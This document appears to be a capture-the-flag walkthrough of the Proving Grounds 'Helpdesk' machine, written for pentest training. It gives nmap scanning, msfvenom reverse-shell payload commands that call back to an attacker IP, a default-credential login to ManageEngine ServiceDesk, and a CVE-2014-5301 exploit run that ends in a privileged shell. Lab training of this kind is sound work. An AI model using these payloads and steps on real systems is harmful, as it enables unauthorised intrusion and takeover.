---
title: Helpdesk Walkthrough - Proving Grounds
description: "Walkthrough of the Helpdesk machine from Proving Grounds "
author: Cyber Operator
date: 2024-07-24T14:48:18.308Z
tags:
  - Tags
---
# Helpdesk Exploitation Walkthrough

This machine is under the "Easy" level of Proving Grounds, it is valuable for general pentest practice or for exam preparation (such as OSCP etc).  This walkthrough may be completed under various sessions, you may see the target IP address change.

Step by step:

1. ## Scan with NMAP:

I like to do two nmap scans, one a very simple pass with the standard options.  This is mostly to have something to look at while waiting for the more detailed scan results, which follow this command:

`nmap -sC -sV --script vuln -p- [target IP]`

This will do a version scan, basic vulnerability check and scan all ports.  It takes time, good idea to let it run while we explore based on the simple scan results.

Here are the detailed scan results:

![](/static/img/screenshot-2024-07-24-at-11.26.36 am.png)

![](/static/img/screenshot-2024-07-24-at-11.27.38 am.png)

Right from the results, we see that there is a webserver in port 8080 and that there are some vulnerabilities (maybe user input fields, or a form).  So let's visit the site (IP:port combination) to see what's there:

![](/static/img/screenshot-2024-07-24-at-11.30.46 am.png)

There may be something there, let's see what else we can find first.  We see that this is a Windows Server, 2008 R2, RPC port, Microsoft Terminal service, SMB (an interoperability service) and some magic found in the form of CVE-2009-3103 "execute arbitrary code".  As interesting as the 8080 server is, this one seems like a juicier starting point so let's start there.

## 2. Exploitation

We find an exploit in Exploit DB, including the command to use msfvenom to generate the required shellcode:

![](/static/img/screenshot-2024-07-24-at-11.43.17 am.png)

Specifically, we need to download the exploit code, then replace the shellcode in the download with our own generated shellcode.  We will generate that shellcode using the following command (can be found as a comment on the exploit code)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker IP] LPORT=[attacker port, such as 443]  EXITFUNC=thread  -f python`

Next, we generate our shellcode for our payload:

![](/static/img/screenshot-2024-07-24-at-11.50.17 am.png)

We now copy our payload into our downloaded exploit code, which we can edit using a text edit tool, here we used nano:

![](/static/img/screenshot-2024-07-24-at-11.55.49 am.png)

Now we have a ready exploit!  You can execute from there but we probably never needed to get here because there is an even easier way!

Before executing that, let's go back to our other identified vulnerability on the webserver (why are we doing this: it always helps to have multiple attack surfaces!)

Here is the lesson, always use Google and never forget to try default credentials!  Here, we know that the service used is ManageEngine Service desk.  So a simple Google search for default credentials reveals administrator:administrator!

![](/static/img/screenshot-2024-07-24-at-12.24.24 pm.png)

And we are successfully into the service:

![](/static/img/screenshot-2024-07-24-at-12.27.38 pm.png)

We are authenticated, which increases our list of potential exploits.  Let's search using searchsploit to see what's out there:

![](/static/img/screenshot-2024-07-24-at-12.42.35 pm.png)

CVE-2014-5301 looks promising!

![](/static/img/screenshot-2024-07-24-at-12.47.26 pm.png)

We create a reverse shell package:

`msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.52 LPORT=4444 -f war > shell.war`

Then download our exploit:

![](/static/img/screenshot-2024-07-24-at-12.53.55 pm.png)

And execute the exploit:

`python3 CVE-2014-5301.py [target IP] 8080 administrator administrator shell.war`

![](/static/img/screenshot-2024-07-24-at-12.59.21 pm.png)

And we get a connection with a privileged shell on our listener window!

![](/static/img/screenshot-2024-07-24-at-1.00.50 pm.png)

Then we move to the Administrator's Desktop and find our flag.

![](/static/img/screenshot-2024-07-24-at-1.02.27 pm.png)